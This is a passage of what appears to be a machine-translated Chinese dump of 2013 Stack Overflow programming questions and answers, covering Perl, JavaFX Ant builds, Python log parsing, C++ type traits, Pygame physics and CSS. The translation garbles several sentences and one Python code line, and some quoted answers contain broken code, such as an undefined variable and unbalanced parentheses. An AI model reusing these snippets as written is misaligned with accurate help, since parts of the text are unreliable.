该函数被调用`quotemeta`，而不是`metaquote`。此外，您的正则表达式中缺少右括号：

```
#!/usr/bin/perl
use warnings;
use strict;

my $a;

$a->{'someone'} = "a _{person}";
$a->{'person'}  = "gremlin";

my $string = "_{someone} and a thing";
while($string =~ /(_\{(.*?)\})/g){
    my $search  = quotemeta($1);
    my $replace = $a->{$2};
    $string =~ s/$search/$replace/;
}
print "$string\n"; 
```

我还添加`strict`并`warnings`帮助自己避免常见的陷阱。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-19T21:14:39.203

我认为这应该是更有效的变体：

```
use strict;
my $a;
$a->{'someone'} = "a _{person}";
$a->{'person'} = "gremlin";

my $string = "_{someone} and a thing";
while( $string =~ s/(_\{(.*?)\})/ $a->{$2} /ges ) {}
print $string."\n"; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-19T21:23:58.450

*此变体反复将字符串中的所有*占位符替换为其对应的哈希值，直到没有剩余。

此外，`a`对于任何变量来说，它都是一个错误的标识符，所以我将它命名为`tokens`。

```
use strict;
use warnings;

my %tokens = (
  someone => 'a _{person}',
  person  => 'gremlin',
);

my $string = '_{someone} and a thing';

1 while $string =~ s/_\{([^}]+)\}/$tokens{$1}/g;

print $string, "\n"; 
```

**输出**

```
a gremlin and a thing 
```

# java - JavaFX ANT builder 不工作：所有文件集都是空的

> ID：15510358
> 
> 赞同：0
> 
> 时间：2013-03-19T21:02:08.463
> 
> 标签：java, ant, build, javafx-2, build.xml

我已经阅读了文档，但找不到让它工作，我正在使用最新的 JDK/Eclipse/Debian。

这是我的 build.xml

```
<project name="PMRx" default="default" basedir="."
xmlns:fx="javafx:com.sun.javafx.tools.ant">

<property name="src.dir" location="src" />
<property name="build.dir" location="build" />
<property name="dist.dir" location="dist" />
<property name="docs.dir" location="docs" />
<property name="application.vendor.dir" location="Comelecinca" />
<property name="application.title.dir" location="PMRx" />
<property name="build.classes.dir" location="build/classes" />
<property name="certification.dir" location="/home/rafael/Workspace/Certification" />
<property name="application.title" location="Sistema de Monitoreo Remoto" />

<target name="default">

    <taskdef resource="com/sun/javafx/tools/ant/antlib.xml" uri="javafx:com.sun.javafx.tools.ant"
        classpath=".:/usr/lib/jvm/java-7-oracle/lib/ant-javafx.jar" />

    <!-- Details about application -->
    <fx:application id="PMRx" name="Sistema de Monitoreo Remoto"
        mainClass="pmrx.Ventana" />

    <!-- Define what auxilary resources are needed -->
    <fx:resources id="appRes">
        <fx:fileset dir="dist" includes="lib/*.jar" />
    </fx:resources>

    <fx:jar destfile="${dist.dir}/pmrx.jar">

        <!-- Define what to launch -->
        <fx:application refid="PMRx" />

        <!-- Define what classpath to use -->
        <fx:resources refid="appRes" />

        <manifest>
            <attribute name="Implementation-Vendor" value="${application.vendor}" />
            <attribute name="Implementation-Title" value="${application.title}" />
            <attribute name="Implementation-Version" value="1.0" />
        </manifest>

        <!-- Define what files to include -->
        <fileset dir="${build.classes.dir}" />
    </fx:jar>

    <fx:signjar keyStore="${certification.dir}/sopc.crt"
        destdir="dist" alias="comelecinca" storePass="951753" keyPass="951753">
        <fileset dir='dist/*.jar' />
    </fx:signjar>

    <fx:deploy outdir="${dist.dir}" embedJNLP="true"
        outfile="${application.title}">
        <fx:application refId="PMRx" />

        <fx:resources refid="appRes" />

        <fx:info title="Sample app: ${application.title}" vendor="${application.vendor}" />

        <!-- Request elevated permissions -->
        <fx:permissions elevated="true" />
    </fx:deploy>

</target> 
```

这是我得到的错误：

```
BUILD FAILED
/home/rafael/Workspace/PMRx/build.xml:19: All filesets are empty. 
```

这将对应于该行：

```
<fx:jar destfile="${dist.dir}/pmrx.jar"> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:43:19.713

**已解决：**问题是我在 fx:jar 过程中指示要包含的文件的空路径。

澄清一下，令人困惑的是错误指向第 19 行。但它只是告诉整个 XML 块（从第 19 行开始）是错误所在，实际上问题出在一个内部部分，在这种特定情况下，问题是：

```
<fileset dir="${build.classes.dir}" /> 
```

我只是将 dir 的参数更改为我真正托管 .class 文件的位置，问题就解决了。

# java - 在两个不同的固定数量的地方用逗号格式化一个数字

> ID：15510361
> 
> 赞同：3
> 
> 时间：2013-03-19T21:02:11.507
> 
> 标签：java, number-formatting

一个例子将最好地解释我想要什么 - 可以说，我有一个这样的数字`34236536465.57`。我想这样格式化它：`34,23,65,36,465.57`. 除了手动操作之外，我可以使用任何 JDK 类或第三方库吗？我已经尝试过`java.text.DecimalFormat("#,##,###.##")`，但是逗号仅在 3 位数字之后出现，而我希望逗号在 3 位数字之后出现，然后在 2 位数字之后出现。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T04:39:52.670

[com.ibm.icu.text.DecimalFormat](http://icu-project.org/apiref/icu4j/com/ibm/icu/text/DecimalFormat.html) class of ICU4J library can exactly do the same thing. And we can use the same pattern "#,##,###.##" as it is used in java.text.DecimalFormat to format the way exactly I wanted.

# python - 返回日志文件中的所有匹配行

> ID：15510367
> 
> 赞同：0
> 
> 时间：2013-03-19T21:02:32.753
> 
> 标签：python, loops, pattern-matching, python-2.4

我需要一些关于循环的帮助，或者更好的方法来解决这个问题。答案可能很明显，但我是新来的，现在感到精神障碍：我有一个看起来像这样的日志文件，我正在尝试匹配具有相同 ID 的所有行：所以我以后可以比较匹配的 ID。我能够匹配第一行，但随后我的循环似乎终止了。我不确定我做错了什么，或者是否有更好的方法。任何帮助深表感谢！

一些注意事项：

*   当我拆分行时，XYZ ID 列在行 [2] 处被索引，其中 len(line) == 11。
*   我正在尝试遍历文件并为每一行创建一个内部循环，该循环扫描文件的其余行以查找“匹配”。
*   如果找到匹配项，我想返回它以便比较值
*   问题是我的代码在找到第一个匹配项后似乎中断了，因此只返回找到的第一个匹配项

下面是我的代码和我正在使用的日志文件的示例（包括一些编辑的字符串，只是为了保持一些业务数据的私密性）。实际的日志文件包含逗号，在我粘贴到此论坛之前已将其删除：

```
f = open('t.log','r')
for line in f:
    aline = line.replace(',','').split()
    if len(aline)==11:
        for line in f:
            bline = line.replace(',','').split()
            if len(bline)==11 and aline[2]==bline[2]:
                print 'a: ', aline
                print 'b: ', bline

#t.log

[13:40:19.xxx009] status    -------             
[13:40:19.xxx013] status    XYZ -4  -5675.36     quote  449.70/- 449.78 avg 1418.84 -7474.48       0.134     -55.630    -395.148    
[13:40:19.xxx021] status    XYZ  ID:22P00935xxx -4  3.92     quote:    0.98/   1.02  avg:   -0.98   -0.16
[13:40:19.xxx024] status    XYZ  ID:22C0099xxx0 -2  26.4     quote:   11.60/  11.85  avg:  -13.20    2.70
[13:40:19.xxx027] status    XYZ  ID:22P0099xxx0 10  -17.18   quote:    1.86/   1.90  avg:   -1.72    1.42
[13:40:19.xxx029] status    XYZ  ID:22C00995xxx 4   -42.5    quote:    8.20/   8.30  avg:  -10.62   -9.70
[13:40:19.xxx031] status    XYZ  ID:22P00995xxx 2   9.66     quote:    3.30/   3.40  avg:    4.83   16.26
[13:40:19.xxx535] status    total xx5.52                

[13:41:20.xxx688] status    -------             
[13:41:20.xxx691] status    XYZ -4  -5675.36     quote  449.83/- 449.99 avg 1418.84 -7475.32      -0.374    -213.006     -39.391    
[13:41:20.xxx701] status    XYZ  ID:22P00935xxx -4  3.92     quote:    0.96/   1.00  avg:   -0.98   -0.08
[13:41:20.xxx704] status    XYZ  ID:22C0099xxx0 -2  26.4     quote:   11.65/  11.90  avg:  -13.20    2.60
[13:41:20.xxx708] status    XYZ  ID:22P0099xxx0 10  -17.18   quote:    1.83/   1.87  avg:   -1.72    1.12
[13:41:20.xxx712] status    XYZ  ID:22C00995xxx 4   -42.5    quote:    8.20/   8.30  avg:  -10.62   -9.70
[13:41:20.xxx716] status    XYZ  ID:22P00995xxx 2   9.66     quote:    3.30/   3.35  avg:    4.83   16.26
[13:41:20.xxx718] status    XYZ  ID:22C0095xxx0 -10 35.6     quote:    5.40/   5.50  avg:   -3.56  -19.40
[13:41:20.001362] status    total xx6.68    

Result:    
$ python pnlcomp.py
    a:  ['[13:40:19.000021]', 'statusAAPL', '130322P00435000', '-4', '3.92', 'quote:', '0.98/', '1.02', 'avg:', '-0.98', '-0.16']
    b:  ['[13:41:20.000701]', 'statusAAPL', '130322P00435000', '-4', '3.92', 'quote:', '0.96/', '1.00', 'avg:', '-0.98', '-0.08'] 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:22:29.037

您可以使用过滤器功能来获取其中包含“ID”的任何行。

```
file = open('t.log', 'r')
result = filter(lambda s: "ID" in s, file) 
```

您还可以使用列表推导：

```
file = open('t.log', 'r')
result = [s for s in file if 'ID' in s] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T21:35:41.567

您可能应该为此使用正则表达式（也称为正则表达式）。Python 有 re 模块，它为 python 实现正则表达式。

将此作为查看方向的示例：[stackoverflow question find multiple matches in a string](https://stackoverflow.com/questions/924127/python-regex-finding-multiple-matches-in-a-string)。

从上面摘录：日志文件看起来像：

```
[1242248375] SERVICE ALERT: myhostname.com;DNS: Recursive;CRITICAL 
```

正则表达式看起来像：

```
regexp = re.compile(r'\[(\d+)\] SERVICE NOTIFICATION: (.+)') 
```

是这样的：

*   r => 原始字符串（在正则表达式中总是推荐）
*   \[ => 匹配方括号（否则将是一个特殊字符）
*   (\d+) => 匹配一个或多个小数 \d = 小数和 + 表示 1 个或多个
*   \] => 后跟一个右方括号
*   SERVICE NOTIFICATION: => 按顺序完全匹配这些字符。
*   (.+) => . (dot) 匹配任何字符。+ 再次表示 1 或更多

括号将结果分组。

我用你的日志文件格式做了一个简短的正则表达式。假设您上面的日志保存为 log.txt。

```
import re
regexp = re.compile(r'\[(\d{2}:\d{2}:\d{2}\.xxx\d{3})\][\s]+status[\s]+XYZ[\s]+ID:([0-9A-Zx]+)(.+)')

f = open("log.txt", "r")
for line in f.readlines():
    print line
    m = re.match(regexp, line)
    #print m
    if m:
        print m.groups() 
```

正则表达式乍一看并不简单，但如果您搜索正则表达式或 re AND python，您会发现有用的示例。

为我输出这个：

```
[13:40:19.xxx021] status    XYZ  ID:22P00935xxx -4  3.92     quote:    0.98/   1.02  avg:   -0.98   -0.16

('13:40:19.xxx021', '22P00935xxx', ' -4  3.92     quote:    0.98/   1.02  avg:   -0.98   -0.16')
[13:40:19.xxx024] status    XYZ  ID:22C0099xxx0 -2  26.4     quote:   11.60/  11.85  avg:  -13.20    2.70

('13:40:19.xxx024', '22C0099xxx0', ' -2  26.4     quote:   11.60/  11.85  avg:  -13.20    2.70')
[13:40:19.xxx027] status    XYZ  ID:22P0099xxx0 10  -17.18   quote:    1.86/   1.90  avg:   -1.72    1.42

('13:40:19.xxx027', '22P0099xxx0', ' 10  -17.18   quote:    1.86/   1.90  avg:   -1.72    1.42')
[13:40:19.xxx029] status    XYZ  ID:22C00995xxx 4   -42.5    quote:    8.20/   8.30  avg:  -10.62   -9.70

('13:40:19.xxx029', '22C00995xxx', ' 4   -42.5    quote:    8.20/   8.30  avg:  -10.62   -9.70')
[13:40:19.xxx031] status    XYZ  ID:22P00995xxx 2   9.66     quote:    3.30/   3.40  avg:    4.83   16.26
('13:40:19.xxx031', '22P00995xxx', ' 2   9.66     quote:    3.30/   3.40  avg:    4.83   16.26') 
```

每第二行是输出，它是一个包含匹配组的列表。

如果将其添加到上面的程序中：

```
print "ID is : ", m.groups()[1] 
```

输出是：

```
[13:40:19.xxx021] status    XYZ  ID:22P00935xxx -4  3.92     quote:    0.98/   1.02  avg:   -0.98   -0.16

ID is :  22P00935xxx

[13:40:19.xxx024] status    XYZ  ID:22C0099xxx0 -2  26.4     quote:   11.60/  11.85  avg:  -13.20    2.70

ID is :  22C0099xxx0 
```

哪个与您要比较的 ID 相匹配。只需稍微玩一下即可获得您真正想要的结果。

**最后一个示例** 捕获 ID，测试它是否已经存在，并将匹配的行添加到以 te ID 作为其键的字典中：

导入重新正则表达式 = re.compile(r'[(\d{2}:\d{2}:\d{2}.xxx\d{3})][\s]+status[\s]+XYZ [\s]+ID:([0-9A-Zx]+)(.+)')

```
res = {}

f = open("log.txt", "r")
for line in f.readlines():
    print line
    m = re.match(regexp, line)  
    if m:
        print m.groups()
        id = m.groups()[1]
        if id in res:
            #print "added to existing ID"
            res[id].append([m.groups()[0], m.groups()[2]])
        else:
            #print "new ID"
            res[id] = [m.groups()[0], m.groups()[2]]

for id in res:
    print "ID: ", id
    print res[id] 
```

现在您可以四处玩耍并对其进行微调以适应您的需求。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-19T21:37:03.407

这可能不是解决您的问题的最佳方法，但如果您想知道如何使其工作：

这里的问题是你的内`for line in f:`循环消耗了整个文件的其余部分——所以当你回到外循环时，没有什么可以读的了。（还有第二个问题：当我在你的数据上运行你的代码时，`len(aline)`总是*12*，而不是*11*。但这是一个微不足道的修复。）

这不是特定于文件的；这就是所有迭代器在 Python 中的工作方式。对于任何迭代器，有两种通用的方法来处理这个问题，还有一种特定于文件的解决方案。

首先，有[`itertools.tee`](http://docs.python.org/2/library/itertools.html#itertools.tee). 这需要一个迭代器，并返回*两个*迭代器，每个迭代器都可以独立推进。在幕后，它显然必须使用一些存储来处理不同步的事情，这就是文档这样说的原因：

> 一般来说，如果一个迭代器在另一个迭代器启动之前使用了大部分或全部数据，那么使用 list() 而不是 tee() 会更快。

这是另一种选择：将整个迭代器读入 a `list`，这样你就可以循环切片。

这显然是一个迭代器使用大部分数据而另一个迭代器坐在那里等待的情况之一。例如，第一次通过内部循环时，您在外部循环读取第 1 行之前读取第 1-20000 行。因此，a`list`在这里是一个更好的选择。所以：

```
f = open('t.log','r')
contents = list(f)
f.close()
for idx, line in enumerate(contents):
    aline = line.replace(',','').split()
    if len(aline)==11:
        for line in contents[idx+1:]:
            bline = line.replace(',','').split()
            if len(bline)==11 and aline[2]==bline[2]:
                print 'a: ', aline
                print 'b: ', bline 
```

最后，如果你有一个花哨的迭代器可以检查点并以某种方式恢复，你可以在内部循环之前检查点它，然后在之后立即恢复它。而且好在files恰好有这么一个东西：[`tell`](http://docs.python.org/2/library/stdtypes.html#file.tell)返回当前文件位置，并[`seek`](http://docs.python.org/2/library/stdtypes.html#file.seek)跳转到指定位置。（有一个很大的警告说“如果文件以文本模式打开（不带`'b'`），则只有返回的偏移量`tell()`是合法的。”但这很好；你只使用`tell`这里返回的偏移量。）

所以：

```
f = open('t.log','r')
for line in f:
    aline = line.replace(',','').split()
    if len(aline)==11:
        pos = f.tell()
        for line in f:
            bline = line.replace(',','').split()
            if len(bline)==11 and aline[2]==bline[2]:
                print 'a: ', aline
                print 'b: ', bline
        f.seek(pos) 
```

# c++ - 检测一个类型是否是零元素数组？

> ID：15510368
> 
> 赞同：3
> 
> 时间：2013-03-19T21:02:34.310
> 
> 标签：c++, arrays, templates, c++11, typetraits

考虑以下函数：

```
template <typename Type>
void f(const Type& x) 
```

`std::tuple`无论传递的类型是空的还是空的，我都想做一些特别的事情（没有专门化）`std::array`。对于 nu 元素的元组，我可以使用，`std::is_same<Type, std::tuple<>>::value`但是我可以使用什么技巧来检测零元素数组？

（我正在寻找不需要创建另一个函数或类的解决方案，...）

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-19T21:27:39.000

您可以使用`std::tuple_size`，因为它也适用`std::array`！见[这里](http://en.cppreference.com/w/cpp/container/array/tuple_size)。只需使用：

```
std::tuple_size<Type>::value == 0 
```

检查`Type`是空`std::tuple<>`的还是空的`std::array<T,0>`。

* * *

综上所述，问题仍然是如果`Type`既不是 a 又`std::tuple`不是 a会发生什么`std::array`。我看到的一般方法是这样的：

```
constexpr bool IsNotTupleOrArray =
  !std::is_class<Type>::value ||
  std::is_same<Type,ExcludeThisClass>::value ||
  sizeof(Type)>1 || // non-portable, works for GCC 4.8+
  ...;

std::conditional< IsNotTupleOrArray,
                  std::false_type,
                  std::tuple_size<Type> >::type::value; 
```

这基本上意味着您必须明确排除其他类型。例如，`is_class<Type>`排除所有基本类型，如`int`、 指针等。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-19T21:09:42.537

如果您不想在没有专业化的情况下这样做，为什么不使用**重载**呢？;) 专门化一个函数模板有时（不，经常）是个坏主意。使用一些 SFINAE 技巧，创建仅在这两个条件适用时才选择的重载并不难。

但是，我已经听到你在喊这不是你想要做的：你想要的是在条件为真时执行的某种`if`内部，以及在条件为假时执行的相应分支。`f()``else`

但是，请注意，这不是[*静态*if](http://channel9.msdn.com/Events/GoingNative/GoingNative-2012/Static-If-I-Had-a-Hammer)，而是常规运行时 if：换句话说，编译器将在编译时 100% 确定这两个分支之一永远不会被执行（并且它可能会发出令人讨厌的警告），但它必须**解析**两个分支并证明它们是合法的。

实际上，这意味着您将无法放置依赖于特定类型`T`（或 的属性`T`）的语句以便可编译。例如，在下面的代码中`compile_time_expression`确定类型是否`T`具有成员函数`foo()`或成员函数`bar()`：

```
T obj;
if (compile_time_expression)
{
    obj.foo();
}
else
{
    obj.bar();
} 
```

但是，如果该特定项`T`没有成员函数*和*`foo()`成员函数，则上述内容将无法编译`bar()`：因为您在这里拥有的是运行时`if`，编译器将必须解析两个分支并确保它们都是可编译的-然后可能优化掉永远不会执行的那个。

不幸的是，C++ 没有任何构造，例如 static if (yet?)，所以**重载 + SFINAE 是解决这个问题的正确方法**。

# jquery - 根据使用 CakePHP 和 JQuery 的选择字段禁用输入字段

> ID：15510373
> 
> 赞同：-1
> 
> 时间：2013-03-19T21:02:55.563
> 
> 标签：jquery, cakephp-2.0

我正在尝试使用 CakePHP 上的 JsHelper 根据选择字段禁用输入字段。

任何人都可以帮助我吗？

我可以根据另一个选择字段填充一个选择字段，但我不能禁用一个字段。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:23:10.243

您可以在选择字段上使用 .change() 函数禁用输入。

小提琴：http: [//jsfiddle.net/9YXFJ/](http://jsfiddle.net/9YXFJ/)

```
$("#IDofSelect").change(function() {
    if (this.value == "1") {
        $("#IDofInput").prop("disabled", false);
    } else {
        $("#IDofInput").prop("disabled", true);
    }
}); 
```

# java - 打印阵列错误

> ID：15510374
> 
> 赞同：1
> 
> 时间：2013-03-19T21:03:03.067
> 
> 标签：java, arrays, methods, printing

这可能是一个简单的修复，但我只是没有看到它。我想弄清楚，如何让我的`printOut()`方法从 main 正确打印`Project5PartA`？我需要获取、设置和返回方法吗？另外，我的while循环在`Tester`课堂上是否必要？

程序编译并一直运行到无穷大，所以我猜while循环是错误的。但它也只能`[Ljava.lang.String;@7c1c8c58`在每一行上连续打印出来。

扩展 main 的类是无关紧要的，是项目的一部分。抱歉，如果发布错误，并感谢您的帮助。

整个程序的输出类似于：

> 吠，吠。
> 
> 喵喵。
> 
> 哇哦。
> 
> 狗说汪，汪。
> 
> 猫说喵，喵。

测试员类：

```
public class Tester {

String[] animalArray = {"Dog", "Cat", "tRex", "Cow", "Pig", "Snake",
    "Goat", "Owl", "Chicken", "Frog"};

String[] noiseArray = {"Woof, woof", "Meow, meow", "Roooaaar", "Mooo",
    "Oink, oink", "Hissss", "Baaa", "Hoot, hoot", "Bock, bock",
    "Ribbit, ribbit"};

String[] printArray = new String[10];

public String printOut() {
    while (true) {
        for (int i = 0; i < 10; i++) {

            String value = (animalArray[i] + " says " + noiseArray[i] + ".");
            printArray[i] = value;

            System.out.println();
            System.out.println(printArray);
            break;

        }
    }
}
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T21:08:01.627

用于[`Arrays.toString()`](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/Arrays.html#toString%28java.lang.Object%5B%5D%29)打印数组的内容。实际上不要打印数组本身。

```
System.out.println(printArray); // Prints [Ljava.lang.String;@7c1c8c58 
System.out.println(Arrays.toString(printArray0); // Prints [Dog says Woof, woof...] 
```

如果确实使用`Arrays.toString()`，请在循环外打印数组。`System.out.println(printArray[i])`您也可以在循环内打印数组的每个部分。

```
public String printOut() {
    while (true) {
        for (int i = 0; i < 10; i++) {

            String value = (animalArray[i] + " says " + noiseArray[i] + ".");
            printArray[i] = value;
            System.out.println();
            System.out.println(printArray[i]); // This works
            break;
        }
    }
    System.out.println(Arrays.toString(printArray); // Also works
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T21:06:49.657

因为 printArray 是数组并且没有 toString() 方法，所以您必须单独打印出每个元素或使用 Arrays.toString(printArray) 方法。

如果它在 while 循环中，这样的东西会让你得到一个不断增长的数组。将其放在 while 循环之外：

```
System.out.println(Arrays.toString(printArray)); 
```

或者在while循环中：

```
System.out.println(printArray[i]); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-19T21:07:08.757

除非您真的希望程序永远运行，否则您不需要 while 循环。

您应该按如下方式更改您的打印语句。（您正在打印数组对象，而不是数组内容。）

```
System.out.println(printArray[i]); 
```

# python - 摆锤模拟

> ID：15510375
> 
> 赞同：0
> 
> 时间：2013-03-19T21:03:09.827
> 
> 标签：python, pygame, physics, physics-engine

我正在尝试在 Pygame 中编写简单的钟摆模拟。关键是我试图直接模拟摆锤上的力（重力和张力），而不是求解描述运动的微分方程。首先，我编写了一个函数，它获取一个向量，将轴系旋转某个角度，然后在新的旋转轴系中返回该向量的分量；这个函数的代码很好，它按预期工作。

模拟的每个刻度，我将重力矢量旋转钟摆和绳索之间的角度，并获得新的组件 - 一个在绳索的方向上，一个与它正交。绳索方向上的张力和分量相互抵消，因此只有正交分量很重要。计算后，我将加速度矢量旋转回法线坐标系，并积分。但是，由此产生的行为并不符合预期。可能是什么原因？

这是代码：

```
from __future__ import division
import copy
import pygame
import random
import math
import numpy as np
import time

clock = pygame.time.Clock()
pygame.init()
size = (width, height) = (600,500)
screen = pygame.display.set_mode(size)

def rotate(vector,theta):
    #rotate the vector by theta radians around the x-axis
    Vx,Vy = vector[0],vector[1]
    cos,sin = math.cos(theta),math.sin(theta)
    newX,newY = Vx*cos-Vy*sin, Vy*cos+Vx*sin #the newX axis is the result of rotating x axis by theta
    return [newX,newY]

class pendulum:
    def __init__(self,x,y,x0,y0):
        self.x = x
        self.y = y
        self.x0 = x0
        self.y0 = y0
        self.velocity = [0,0]
        self.a= [0,0]
        self.angle = 0
    def CalcForce(self):
        self.angle = math.atan2(-(self.y-self.y0),self.x-self.x0)
        gravity = rotate(g,self.angle)
        self.a[1]=gravity[1]
        self.a[0] = 0 #This component is cancelled by the tension
        self.a = rotate(self.a,-self.angle)
    def move(self):
       #print pylab.dot(self.velocity,[self.x-self.x0,self.y-self.y0])
        self.velocity[0]+=self.a[0]
        self.velocity[1]+=self.a[1]
        self.x+=self.velocity[0]
        self.y+=self.velocity[1]
    def draw(self):
        pygame.draw.circle(screen, (0,0,0), (self.x0,self.y0), 5)
        pygame.draw.line(screen, (0,0,0), (self.x0,self.y0), (int(self.x), int(self.y)),3)
        pygame.draw.circle(screen, (0,0,255), (int(self.x),int(self.y)), 14,0)
g = [0,0.4]
p = pendulum(350,100,300,20)

while 1:
    screen.fill((255,255,255))
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            pygame.quit()
    p.CalcForce()
    p.move()
    p.draw()
    clock.tick(60)
    pygame.display.flip() 
```

谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T04:14:42.793

这里有很多问题。我会修几个，留几个给你。

我修复的是：1）既然你已经导入了numpy，你应该使用它，并用向量来写东西；2）对自己的要求是不合理的，把所有的东西都写出来并立即工作；所以你需要绘制中间结果等，就像我在这里绘制`a`的一样，所以你可以看看它是否有意义；3）您的整个“轮换”方法令人困惑；而是考虑组成部分；我在这里直接计算（它更短，更容易阅读和理解等）；4) 在使用时间步长的所有模拟中，您应该明确使用 dt，这样您就可以在不更改其他参数的情况下更改时间步长。

现在，如果您观看它，您会发现它看起来几乎是合理的。请注意，尽管加速度永远不会向上，所以球只是在振动时下落。原因是您没有将绳索的张力包括在球上的力中。我会把那部分留给你。

```
import pygame
import math
import numpy as np

clock = pygame.time.Clock()
pygame.init()
size = (width, height) = (600,500)
screen = pygame.display.set_mode(size)

class pendulum:
    def __init__(self,x,y,x0,y0):
        self.x0 = np.array((x0, y0))
        self.x = np.array((x, y), dtype=float)
        self.v = np.zeros((2,), dtype=float)
        self.a = np.zeros((2,), dtype=float)
    def CalcForce(self):
        dx = self.x0 - self.x
        angle = math.atan2(-dx[0], dx[1])
        a = g[1]*math.sin(angle)  # tangential accelation due to gravity
        self.a[0] = at*math.cos(angle)
        self.a[1] = at*math.sin(angle)
    def move(self):
        #print np.dot(self.a, self.x-self.x0) #is a perp to string?
        self.x += dt*self.v
        self.v += dt*self.a
    def draw(self):
        pygame.draw.circle(screen, (0,0,0), self.x0, 5)
        pygame.draw.line(screen, (0,0,0), self.x0, self.x.astype(int),3)
        pygame.draw.circle(screen, (0,0,255), self.x.astype(int), 14,0)
        pygame.draw.line(screen, (255, 0, 0), (self.x+200*self.a).astype(int), self.x.astype(int), 4)
dt = .001
g = [0,0.4]
p = pendulum(350,100,300,20)

while 1:
    screen.fill((255,255,255))
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            pygame.quit()
    for i in range(100): # don't plot every timestep
        p.CalcForce()
        p.move()
        p.draw()
    clock.tick(60)
    pygame.display.flip() 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T21:29:31.303

如果你想做一个模拟，我认为你做的很艰难。我将从运动方程开始，参见[方程 20](http://www.engr.iupui.edu/~skoskie/ECE680/ECE680_l3notes.pdf)，在这里。点的意思是关于时间的微分——所以方程是`d^2/dt^2 \theta = ...`那么你应该在时间方向上实现一个有限差分方案，并逐步通过时间。在每一步（用 标记`i`），您可以根据摆的长度和 计算鲍勃的 x 和 y 坐标`\theta_i`。查看关于有限差分的[wiki 文章。](http://en.wikipedia.org/wiki/Finite_difference_method)

# html - 在 div 的大小中包含填充

> ID：15510382
> 
> 赞同：0
> 
> 时间：2013-03-19T21:03:25.260
> 
> 标签：html, css, width, padding

这是解释我的问题的图像：

![http://i.stack.imgur.com/8CP3C.png](../Images/71df2235bbf2f26ac4ebee771808804a.png)

我需要在`width: 50%;`完成后考虑填充。如果我不这样做，第一个`div`宽度实际上将是`50% + 2em`因为没有考虑到填充。

如何计算宽度计算中的填充，或者是否有两个相同大小但填充`div`的 s 的解决方法？

小提琴：http: [//jsfiddle.net/sMuCY/](http://jsfiddle.net/sMuCY/)

测试代码：

```
<div style="padding:1em;float:left;width:50%;background-color:#faa">
    This div has 50% width, 1em padding, float left
</div>
<div style="background-color:#0f0;padding:1em">
    This is a div with 1em padding
</div>

<hr>

<div style="float:left;width:50%;background-color:#faa">
    This div has 50% width and float left
</div>
<div style="background-color:#0f0">
    This is a normal div
</div> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-19T21:06:18.887

您可以使用`box-sizing`属性来更改盒子模型的默认行为：

```
div {box-sizing: border-box;} 
```

[演示](http://jsfiddle.net/sMuCY/1/)

另一个测试差异的演示：http: [//jsfiddle.net/sMuCY/2/](http://jsfiddle.net/sMuCY/2/)

阅读：[http ://css-tricks.com/box-sizing/](http://css-tricks.com/box-sizing/)

还请注意，`-moz-`Firefox 中需要该前缀。IE 从第 8 版开始支持此属性。

# java - 从另一个类中的方法创建动作监听器

> ID：15510383
> 
> 赞同：0
> 
> 时间：2013-03-19T21:03:25.657
> 
> 标签：java, swing, awt, actionlistener

嗨，到目前为止，我的代码是这样的：单击一个按钮，打开一个组合框。我想在 ComboBox 上选择一个选项，根据选择的选项，我想使用 getSelectIndex() 打开另一个组合框。

这是我的代码中相关的部分。我知道我必须使其他组合框不可见或不被删除，但目前我只是想让一个组合框出现。如您所见，我已经为可以工作并打开组合框的按钮插入了动作侦听器。但是，在组合框中选择字符串时，不会发生任何事件。但是，当我运行它时，没有出现组合框。

```
public class Work extends JFrame {
// variables for JPanel

  private JPanel buttonPanel;
  private JButton timeButton;

   public Work() 
 {
       setLayout(new BorderLayout()); 

      buttonPanel = new JPanel();
  buttonPanel.setBackground(Color.RED);
  buttonPanel.setPreferredSize(new Dimension(400, 500));
      add(buttonPanel,BorderLayout.WEST);
      timeButton = new JButton("Time"); 
  buttonPanel.add(timeButton);

  buttontime clickTime = new buttontime(); // event created when time button is clicked
  timeButton.addActionListener(clickTime);

    Time timeObject = new Time();
  timeObject.SelectTime();
  buttontime2 selectDest = new buttontime2();
  timeObject.getAirportBox().addActionListener(selectDest);

   }

       public class buttontime implements ActionListener { //creating actionlistener for clicking on timebutton to bring up a combobox
  public void actionPerformed(ActionEvent clickTime)  {
           Time timeObject = new Time();
           timeObject.SelectTime();
           add(timeObject.getTimePanel(),BorderLayout.EAST);
           timeObject.getTimePanel().setVisible(true); 
           timeObject.getTimePanel().revalidate() ;
           timeObject.getAirportBox().setVisible(true);

  }
  }

          public class buttontime2 implements ActionListener{
  public void actionPerformed(ActionEvent selectDest) {
   Time timeObject = new Time();
  timeObject.SelectTime();

  if(timeObject.getAirportBox().getSelectedIndex() == 1) {

  timeObject.getEastMidBox().setVisible(true);

  }

  else if(timeObject.getAirportBox().getSelectedIndex() == 2) {

  timeObject.getBirmBox().setVisible(true);
 }
  else if(timeObject.getAirportBox().getSelectedIndex() == 3) {

  timeObject.getMancbox().setVisible(true);
  }
  else if(timeObject.getAirportBox().getSelectedIndex() == 4) { 
 timeObject.getHeathBox().setVisible(true);
  }   

   }
  }

public static void main (String args[]) {
events mainmenu = new events(); //object is created

mainmenu.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
mainmenu.setSize(800,500);
mainmenu.setVisible(true);
mainmenu.setLayout(new BorderLayout());
mainmenu.setTitle("Learning how to use GUI");
